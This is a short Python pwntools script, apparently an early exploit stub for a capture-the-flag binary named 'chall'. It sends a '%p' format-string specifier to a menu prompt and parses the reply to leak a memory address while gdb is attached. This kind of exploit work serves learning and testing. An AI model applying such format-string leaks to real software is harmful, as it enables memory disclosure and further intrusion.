def use_dragons(data):
	p.sendlineafter('Your choice: ', '1')
	p.sendlineafter('Say something in Valyrian: ', data)
	leak = int(p.recvline()[-15:-1], 16)
	
	return leak
from pwn import *

p = process('./chall')

gdb.attach(p)

leak1 = use_dragons("%p")
info('leak 1: %s'%hex(leak1))

p.interactive()
